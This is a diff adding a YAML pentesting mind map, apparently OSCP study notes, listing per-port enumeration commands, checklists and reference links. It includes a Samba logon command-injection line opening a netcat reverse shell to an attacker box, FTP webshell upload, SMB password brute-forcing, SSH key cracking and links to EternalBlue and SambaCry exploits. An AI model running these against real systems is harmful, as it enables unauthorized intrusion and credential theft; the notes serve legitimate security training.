@@ -1,0 +1,480 @@
+---
+- name: 21/FTP
+  port: '21'
+  link: ''
+  notes: "maybe brute-force"
+  data_manual: "anonymous login check</br>
+                ftp <ip address> username : anonymous pwd : anonymous </br>
+                file upload -> put shell.php"
+  refer:
+    - "https://book.hacktricks.xyz/pentesting/pentesting-ftp"
+    - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/ftp"
+  children:
+  - name: "Anonymous Login"
+    link: https://stackoverflow.com/questions/3936911/how-can-i-login-anonymously-with-ftp-usr-bin-ftp/20031581
+    children:
+    - name: File Read
+      link: http://www.simotime.com/ftp4cmd1.htm
+      children:
+      - name: Possible Any confidential Information
+        link: https://epi052.gitlab.io/notes-to-self/blog/2018-09-30-hack-the-box-access/
+        children: []
+    - name: File Write
+      link: https://medium.com/vulnerables/hackthebox-devel-ecf86cf7822f
+      children:
+      - name: Possible Filewrite to access through Web
+        link: https://medium.com/vulnerables/hackthebox-devel-ecf86cf7822f
+        children: []
+      - name: FTP to file upload ==> Execute from web == webshell
+        link: ''
+        children: []
+  - name: "Password Checking if you found with othe enum"
+    link: ''
+    children: []
+
+- name: 22/SSH
+  port: '22'
+  link: ''
+  notes: No Brute-Force 99.99%
+  data_manual: "id_rsa.pub : Public key that can be used in authorized_keys for login </br>
+                id_rsa : Private key that is used for login. Might ask for password. can be cracked with <a href='https://github.com/truongkma/ctf-tools/blob/master/John/run/sshng2john.py' target='_blank'>ssh2john</a> and john
+                id_rsa </br>
+                ssh -i id_rsa user@<ip address> </br>
+                For passwordless login, add id_rsa.pub to target's authorized_keys ssh2john"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-ssh"
+  children:
+  - name: "Password Checking if you found with other enum"
+    link: ''
+    children: []
+
+- name: 23/TELNET
+  port: '23'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-telnet"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/telnet"
+  children: ''
+
+- name: 43/WHOIS
+  port: '43'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/43-pentesting-whois"
+  children: ''
+
+- name: ‎25,465,587/SMTP
+  port: '25,465,587'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-smtp"
+  children:
+  - name: "‎Username Enumration which can be chained ‎to other vulnerability"
+    link: 'https://tools.kali.org/information-gathering/smtp-user-enum'
+    children: []
+
+- name: ‎‎53/DNS
+  port: '53'
+  link: ''
+  notes: ''
+  data_manual: "<ul>
+                <li>If port 53 is open</li>
+                <li>Add host to /etc/hosts</li>
+                <li>dig axfr smasher.htb @10.10.10.135 https://ghostphisher.github.io/smasher2</li>
+                <li>Add the extracted domain to /etc/hosts and dig again</li>
+                </ul>"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-dns"
+  children:
+  - name: "‎‎‎‎Can be used for getting information about ‎subdomain"
+    link: ''
+    children: []
+
+- name: 79/Finger
+  port: '79'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-finger"
+  children: ''
+
+- name: "‎‎80|443/HTTP/S"
+  port: '80,443'
+  link: ''
+  notes: ''
+  data_manual: "<h2>Checklist</h2></br>
+                <input type='checkbox'>View SSL certificates for usernames View Source code</br>
+                <input type='checkbox'>Check /robots.txt, .htaccess, .htpasswd Check HTTP Request</br>
+                <input type='checkbox'>Run Burp Spider</br>
+                <input type='checkbox'>View Console</br>
+                <input type='checkbox'>Use Nikto</br>
+                <input type='checkbox'>Check OPTIONS</br>
+                <input type='checkbox'>HTTP PUT / POST File upload Parameter fuzzing with wfuzz Browser response vs Burp response Shell shock (cgi-bin/status)</br>
+                <input type='checkbox'>Cewl wordlist and directory bruteforce</br>
+                <input type='checkbox'>nmap --script http-enum 192.168.10.55</br>
+                <input type='checkbox'>Apache version exploit & other base server exploits"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-web"
+  children:
+  - name: "‎Follow method web pentesting mind map"
+    link: ''
+    children: ''
+  - name: "‎Read OSCP notes book"
+    link: ''
+    children: ''
+
+- name: 88/Kerberos
+  port: '88'
+  link: 'https://0xdf.gitlab.io/2020/03/21/htb-forest.html'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/kerberos"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md"
+  children:
+  - name: 'Nếu service chạy LDAP kerberos chạy GetNPUsers.py để lấy hash password'
+    link: ''
+    children: ''
+
+- name: 110,995/POP
+  port: '110,995'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-pop"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/pop3"
+  children: ''
+
+- name: 111/rpcbind
+  port: '111'
+  link: 'https://0xdf.gitlab.io/2020/10/31/htb-fuse.html'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-rpcbind"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/ms-rpc"
+  children: ''
+
+- name: ‎135,593/RPC
+  port: '135,593'
+  link: 'https://infosecwriteups.com/hackthebox-forest-5a11553de1'
+  notes: "‎rpcclient -U '%' -N <IP>"
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/ms-rpc"
+  children:
+  - name: "‎USERname Enumaration"
+    link: ''
+    children: []
+  - name: "‎Tool"
+    link: ''
+    children:
+      - name: "RPCCLIENT"
+        link: ''
+        children: []
+
+- name: 137,138,139/NetBios
+  port: '137,138'
+  link: 'https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios"
+  children: ''
+
+- name: "‎‎139|445/SMB"
+  port: '139,445'
+  link: 'https://book.hacktricks.xyz/pentesting/pentesting-smb'
+  notes: '‎Accessing Without Creds, ‎Accessing with any username'
+  data_manual: "<h2>Command Enum</h2></br>
+                <ul>
+                <li><input type='checkbox'> nmap --script smb-protocols <ip address></li>
+                <li><input type='checkbox'> smbclient -L //<ip address></li>
+                <li><input type='checkbox'> smbclient -L //<ip address> -N</li>
+                <li><input type='checkbox'> smbclient --no-pass -L <ip address></li>
+                <li><input type='checkbox'> smbclient //<ip address>/share_name</li></br>
+                <li><input type='checkbox'> smbmap -H <ip address></li>
+                <li><input type='checkbox'> smbmap -H <ip address> -u '' -p ''</li>
+                <li><input type='checkbox'> smbmap -H <ip address> -s share_name</li></br>
+                <li><input type='checkbox'> crackmapexecsmb <ip address> -u '' -p '' --shares</li>
+                <li><input type='checkbox'> crackmapexecsmb <ip address> -u 'sa' -p '' --shares</li>
+                <li><input type='checkbox'> crackmapexecsmb <ip address> -u 'sa' -p 'sa' --shares</li>
+                <li><input type='checkbox'> crackmapexecsmb <ip address> -u '' -p '' --share share_name</li></br>
+                <li><input type='checkbox'> enum4linux -a <ip address></li>
+                <li><input type='checkbox'> rpcclient -U '' <ip address></li>
+                <ul>
+                <li>enumdomusers</li>
+                <li>enumdomgroups</li>
+                <li>queryuser [rid]</li>
+                <li>getdompwinfo</li>
+                <li>getusrdompwinfo [rid]</li>
+                </ul>
+                <li><input type='checkbox'> ncrack -u username -P rockyou.txt -T5 <ip address> -p smb -v</li></br>
+                <li><input type='checkbox'> mount -tcifs '//<ip address>/share/' /mnt/wins</li>
+                <li><input type='checkbox'> mount -tcifs '//<ip address>/share/' /mnt/wins-overs=1.0,user=root,uid=0</li>
+                SMBShelltoReverseShell:
+                <li><input type='checkbox'> smbclient -U 'username%password' //<ip address>/sharename</li>
+                <li><input type='checkbox'> smb> logon '/=nc ‘attack box ip’ 4444 -e /bin/bash'</li>
+                </ul>
+                Checklist:
+                Samba symlink directory traversal attack
+                <h2>SMB Exploits :</h2>
+                <ul>
+                <li>Samba 'username map script' Command Execution - CVE-2007-2447</li>
+                <ul>
+                <li>Version 3.0.20 through 3.0.25rc3</li>
+                <li>Samba-usermap-exploit.py - https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851</li>
+                </ul>
+                <li>Eternal Blue - CVE-2017-0144</li>
+                <ul>
+                <li> SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 </li> 
+                <li> https://github.com/adithyan-ak/MS17-010-Manual-Exploit</li> 
+                </ul>
+                <li>SambaCry - CVE-2017-7494</li>
+                <ul>
+                <li> version and before </li> 
+                <li> https://github.com/opsxcq/exploit-CVE-2017-7494</li> 
+                </ul>
+                </ul>"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-smb"
+  - "https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html"
+  children:
+  - name: "‎‎Null Session"
+    link: ''
+    children: 
+      - name: "‎Read Permission"
+        link: ''
+        children:
+          - name: "‎Possible Confidential file to be available"
+            link: ''
+            children: ''
+      - name: "‎Write Permission"
+        link: ''
+        children:
+          - name: "‎‎Possible file uplaod to execute through web ‎service"
+            link: ''
+            children: ''
+      - name: "Tools"
+        link: ''
+        children:
+          - name: "smbmap"
+            link: ''
+            children:
+              - name: "‎For checking What are the shares to ‎available with permission information"
+                link: ''
+                children: ''
+              - name: "‎‎For connecting to SMB server for accessing ‎those shares which are available to access"
+                link: ''
+                children: ''
+  - name: "‎‎Guest Session"
+    link: ''
+    children:
+      - name: "‎Read Permission"
+        link: ''
+        children:
+          - name: "‎Possible Confidential file to be available"
+            link: ''
+            children: ''
+      - name: "‎Write Permission"
+        link: ''
+        children:
+          - name: "‎‎Possible file uplaod to execute through web ‎service"
+            link: ''
+            children: ''
+      - name: "Tools"
+        link: ''
+        children:
+          - name: "smbmap"
+            link: ''
+            children:
+              - name: "‎For checking What are the shares to ‎available with permission information"
+                link: ''
+                children: ''
+              - name: "‎‎For connecting to SMB server for accessing ‎those shares which are available to access"
+                link: ''
+                children: ''
+
+- name: 143,993/IMAP
+  port: '143,993'
+  link: 'https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-imap"
+  children: ''
+
+- name: ‎161/SNMP
+  port: '161'
+  link: ''
+  notes: ''
+  data_manual: "<ul>
+                <li>snmpwalk -c public -v1 <ip address></li>
+                <li>snmpcheck -t <ip address> -c public</li>
+                <li>onesixtyone -cnames -i <ip address></li>
+                <li>nmap -sT -p <ip address> -oG snmp_results.txt </li>
+                <li>snmpenum -t <ip address></li>
+                </ul>"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-snmp"
+  children:
+  - name: "‎‎‎Access Critical information about target ‎system"
+    link: ''
+    children: []
+  - name: "‎Tools"
+    link: 'https://remmina.org/'
+    children:
+    - name: "‎snmp-check"
+      link: ''
+      children: []
+    - name: "‎‎snmpwalk"
+      link: ''
+      children: []
+  
+- name: 194,6667,6660-7000/IRC
+  port: '194,6667,6667,6668,6669,6670,6671,6672,6673,6674,6675,6676,6677,6678,6679,6680,6681,6682,6683,6684,6685,6686,6687,6688,6689,6690,6691,6692,6693,6694,6695,6696,6697,6698,6699,6700,6701,6702,6703,6704,6705,6706,6707,6708,6709,6710,6711,6712,6713,6714,6715,6716,6717,6718,6719,6720,6721,6722,6723,6724,6725,6726,6727,6728,6729,6730,6731,6732,6733,6734,6735,6736,6737,6738,6739,6740,6741,6742,6743,6744,6745,6746,6747,6748,6749,6750,6751,6752,6753,6754,6755,6756,6757,6758,6759,6760,6761,6762,6763,6764,6765,6766,6767,6768,6769,6770,6771,6772,6773,6774,6775,6776,6777,6778,6779,6780,6781,6782,6783,6784,6785,6786,6787,6788,6789,6790,6791,6792,6793,6794,6795,6796,6797,6798,6799,6800,6801,6802,6803,6804,6805,6806,6807,6808,6809,6810,6811,6812,6813,6814,6815,6816,6817,6818,6819,6820,6821,6822,6823,6824,6825,6826,6827,6828,6829,6830,6831,6832,6833,6834,6835,6836,6837,6838,6839,6840,6841,6842,6843,6844,6845,6846,6847,6848,6849,6850,6851,6852,6853,6854,6855,6856,6857,6858,6859,6860,6861,6862,6863,6864,6865,6866,6867,6868,6869,6870,6871,6872,6873,6874,6875,6876,6877,6878,6879,6880,6881,6882,6883,6884,6885,6886,6887,6888,6889,6890,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,6927,6928,6929,6930,6931,6932,6933,6934,6935,6936,6937,6938,6939,6940,6941,6942,6943,6944,6945,6946,6947,6948,6949,6950,6951,6952,6953,6954,6955,6956,6957,6958,6959,6960,6961,6962,6963,6964,6965,6966,6967,6968,6969,6970,6971,6972,6973,6974,6975,6976,6977,6978,6979,6980,6981,6982,6983,6984,6985,6986,6987,6988,6989,6990,6991,6992,6993,6994,6995,6996,6997,6998,6999,7000'
+  link: 'https://0xdf.gitlab.io/2019/04/27/htb-irked.html'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-irc"
+  children: ''
+
+- name: 264/Check Point FireWall-1
+  port: '264'
+  link: 'https://book.hacktricks.xyz/pentesting/pentesting-264-check-point-firewall-1'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-264-check-point-firewall-1"
+  children: ''
+
+- name: 389,636,3268,3269/LDAP
+  port: '389,636,3268,3269'
+  link: 'https://0xdf.gitlab.io/2020/10/31/htb-fuse.html'
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-ldap"
+  - "https://fareedfauzi.gitbook.io/oscp-notes/services-enumeration/ldap"
+  children: ''
+
+- name: ‎2049/NFS
+  port: '2049'
+  link: 'https://www.hackingarticles.in/happycorp1-vulnhub-walkthrough/'
+  notes: ''
+  data_manual: "<ul>
+                <li> showmount -e <ip address></li> 
+                <li> mkdir /mnt/nfs</li> 
+                <li> mount -t nfs <ip address>:/nfspath-shown /mnt/nfs</li> 
+                <li> Permission Denied ? (https://blog.christophetd.fr/write-up-vulnix/)</i> 
+                </ul>"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/nfs-service-pentesting"
+  children:
+    - name: "‎‎Open NFS share"
+      link: ''
+      children: 
+      - name: "‎Read Access"
+        link: ''
+        children:
+        - name: "‎‎Possible Confidential file to be available"
+          link: ''
+          children: ''
+      - name: "Write Access"
+        link: ''
+        children:
+        - name: "‎‎‎Possible file uplaod to execute through web ‎service"
+          link: ''
+          children: ''
+      - name: "‎Tools"
+        link: ''
+        children:
+        - name: "mount"
+          link: ''
+          children:
+          - name: "‎For mounting Share available"
+            link: ''
+            children: ''
+        - name: "showmount"
+          link: ''
+          children:
+          - name: "‎‎For finding shares available"
+            link: ''
+            children: ''
+
+- name: ‎3306/MYSQL
+  port: '‎3306'
+  link: 'https://www.hackingarticles.in/dpwwn-1-vulnhub-walkthrough/'
+  notes: ''
+  data_manual: "nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump- hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql- variables,mysql-vuln-cve2012-2122"
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-mysql"
+  children:
+    - name: "‎If not (Unauthorized)"
+      link: ''
+      children: 
+      - name: "‎‎Try login without password"
+        link: ''
+        children: ''
+      - name: "‎can be used for checking passwords found ‎via diffrent service"
+        link: ''
+        children: ''
+      - name: "‎Tools"
+        link: ''
+        children:
+        - name: "mount"
+          link: ''
+          children:
+          - name: "‎‎mysql (Client)"
+            link: ''
+            children: ''
+ 
+- name: ‎3389/RDP
+  port: '3389'
+  link: ''
+  notes: ''
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/pentesting-rdp"
+  children:
+  - name: "‎‎try login with creds you have."
+    link: ''
+    children: []
+  - name: "‎use different clients like remmina if you see ‎any errors with other client"
+    link: 'https://remmina.org/'
+    children: []
+  - name: "‎If logged in share folder to transfer files ‎through remmina"
+    link: ''
+    children: []
+
+- name: ‎5985|5986/WINRM/S
+  port: '5985,5986'
+  link: 'https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/'
+  notes: "‎‎Evil-Winrm(Tool)"
+  data_manual: ""
+  refer:
+  - "https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm"
+  children:
+    - name: "‎‎Remotly Windows Machine Access"
+      link: ''
+      children: 
+      - name: "‎‎‎With Password"
+        link: ''
+        children: ''
+      - name: "‎With Hash"
+        link: ''
+        children: ''
+      
+
+#Add more at https://book.hacktricks.xyz/pentesting/
